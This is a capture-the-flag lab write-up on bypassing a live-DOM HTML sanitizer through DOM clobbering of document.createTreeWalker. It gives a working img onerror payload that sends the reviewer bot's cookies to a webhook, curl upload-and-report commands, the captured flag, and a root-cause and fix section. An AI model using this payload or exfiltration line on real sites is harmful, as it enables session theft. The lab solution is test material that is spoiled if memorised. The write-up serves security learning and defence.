# JSrace Pwnbox Lab - Live DOM Sanitizer Clobbering

Date: 2026-07-09
Target type: CTF/lab
Bug class: XSS, DOM clobbering, client-side sanitizer bypass, reviewer-bot cookie theft

## Observation

Target: `https://f766430900d4.pwnbox-lab.com/`

Initial facts:

- Login required with provided credentials `demo / demo`.
- Users can upload one `.html` or `.svg` snippet at a time.
- Preview page loads `/raw/<id>` and renders it client-side.
- Reviewer bot opens reported preview URLs.
- Dashboard hints included:
  - `SANITISER v.1 / sync-walk`
  - `DQ early fire ▌ load before guard`

Confirmed workflow:

1. `POST /api/login` sets `session` and `session.sig`.
2. `POST /api/snippet` stores the current snippet and returns `/p/<id>`.
3. `GET /p/<id>` fetches `/raw/<id>` with `credentials: 'omit'`.
4. Preview page calls `setHTML(target, raw)`.
5. `POST /api/report` dispatches the reviewer once.

## Hypothesis

Unlike the previous sanitizer, this one writes attacker HTML into the live preview DOM first and only then walks the tree. If any security-sensitive property is looked up through `document` after insertion, named-element DOM clobbering may break the sanitizer before it strips event handlers.

Most promising target:

```javascript
(root.ownerDocument || document).createTreeWalker(root, NodeFilter.SHOW_ELEMENT)
```

If an injected element can clobber `document.createTreeWalker`, sanitizer setup should throw. A second element with a fast event sink such as `img onerror` may execute before the page's error handler clears the preview.

## Evidence

Live `sanitizer.js` behavior:

```javascript
window.setHTML = function setHTML(targetEl, raw) {
  if (!targetEl) throw new Error('setHTML: missing target element');
  targetEl.innerHTML = String(raw);
  sanitize(targetEl);
};
```

Important implementation details:

```javascript
const _tagName      = Object.getOwnPropertyDescriptor(Element.prototype, 'tagName').get;
const _attributes   = Object.getOwnPropertyDescriptor(Element.prototype, 'attributes').get;
const _removeAttr   = Element.prototype.removeAttribute;
const _removeGetAttrNames = Element.prototype.getAttributeNames;
const _elRemove     = Element.prototype.remove;
```

These are prototype-safe, but the walker setup is not:

```javascript
const walker = (root.ownerDocument || document).createTreeWalker(
  root, NodeFilter.SHOW_ELEMENT
);
```

Local browser reproduction confirmed:

```html
<img name="createTreeWalker"><img src=x onerror="window.__hit=(window.__hit||[]).concat('hit')">
```

Observed result:

- `setHTML()` threw `TypeError: ... createTreeWalker is not a function`
- preview DOM briefly contained the second image with `onerror`
- `onerror` fired before fallback cleanup

Control results:

- plain `<img src=x onerror=...>` was sanitized normally
- multiple load/error vectors (`svg onload`, `details ontoggle`, `iframe`, `object`, `embed`) did not beat the sanitizer
- the exploit required the clobber primitive plus a fast sink

## Test

Minimal working payload:

```html
<img name="createTreeWalker"><img src=x onerror="fetch('https://webhook.site/96bdff61-82fe-4377-8431-b14c437322a3?c='+encodeURIComponent(document.cookie))">
```

Upload and report flow:

```bash
curl -sS -X POST "https://f766430900d4.pwnbox-lab.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"demo","password":"demo"}'

curl -sS -X POST "https://f766430900d4.pwnbox-lab.com/api/snippet" \
  -F "snippet=@jsrace-pwn.html;type=text/html"

curl -sS -X POST "https://f766430900d4.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://f766430900d4.pwnbox-lab.com/p/2e34c542bbb46152192dfe26"}'
```

## Failed Assumptions

1. **Simple event-handler XSS would win the race** - plain `img onerror`, `svg onload`, and `details ontoggle` were stripped before firing.
2. **Autofocus/focus would auto-trigger first** - focusable allowed elements kept `autofocus` but did not yield a firing `onfocus` sink.
3. **Removed active elements like `iframe`, `object`, or `embed` would execute before drop** - local tests showed no execution before removal.
4. **NodeFilter clobbering would be easiest** - `window.NodeFilter` did not become attacker-controlled in this browser context.
5. **A direct cookie exfil request format was sufficient** - raw `document.cookie` in the query string was fragile; `encodeURIComponent` made the result reliable.

## Result

Confirmed chain:

```text
User-controlled HTML upload
-> preview page fetches raw snippet
-> setHTML() writes attacker HTML into live preview DOM with innerHTML
-> <img name="createTreeWalker"> clobbers document.createTreeWalker
-> sanitize() throws before stripping onerror
-> second <img src=x onerror=...> errors immediately
-> fetch() runs in reviewer context
-> encoded document.cookie exfiltrated to webhook
```

Webhook evidence:

```text
c=flag=pwnbox{47b1d83fa9e60c25f4382a7d1ce95b06}
```

Flag:

```text
pwnbox{47b1d83fa9e60c25f4382a7d1ce95b06}
```

## Why Failed Payloads Failed

| Attempt | Why it failed |
|---|---|
| Plain `<img src=x onerror=...>` | Sanitizer stripped `onerror` before the event fired |
| `<svg onload=...>` | `onload` removed before execution |
| `<details ontoggle=...>` | `ontoggle` removed; no execution |
| `<iframe>` / `<object>` / `<embed>` race attempts | Removed without observed execution in the tested environment |
| Unencoded cookie exfil | Request formatting was less reliable when cookie contents included separators |

## Why Working Test Worked

The winning payload does two things in order:

1. The first image creates a named property on `document` that interferes with `document.createTreeWalker`.
2. The second image provides an immediate error event that fires as soon as the broken `src` resolves.

Because `innerHTML` happens before sanitization, both nodes exist in the live DOM during sanitizer startup. The walker setup fails before any attribute stripping occurs, so the second image's `onerror` remains live long enough to execute.

## Root Cause

1. Untrusted HTML was inserted into the live DOM before sanitization.
2. The sanitizer dereferenced `document.createTreeWalker` from the live document instead of from the prototype.
3. Sanitizer failure occurred before dangerous attributes were removed.
4. The page handled sanitizer failure only after the event already had time to fire.

## Impact

- Same-origin JavaScript execution in the reviewer preview context.
- Theft of readable cookies from the reviewer session.
- In a real preview system, likely reviewer compromise or unauthorized actions within the origin.

## Fix

- Sanitize in a detached tree before any live insertion.
- Cache `Document.prototype.createTreeWalker` and call it via the prototype.
- Fail closed on sanitizer exceptions so unsanitized DOM is never briefly exposed.
- Add browser-based regression tests for named-property DOM clobbering against `document` and other host objects.

## Regression Test

- `<img name="createTreeWalker"><img src=x onerror=alert(1)>` must not execute.
- Any sanitizer exception during preview rendering must not leave attacker HTML in the DOM even briefly.
- Plain dangerous payloads and clobber-assisted variants should both end with no live event handlers.

## Conclusion

Confirmed XSS through live-DOM sanitizer clobbering. The exploit is a race only because the sanitizer is invoked after insertion; the actual root cause is trusting live document lookups after attacker-controlled DOM already exists.

## Next Step

Create a clean final writeup centered on the minimal clobber-and-error chain and the defensive lesson about in-place sanitization.
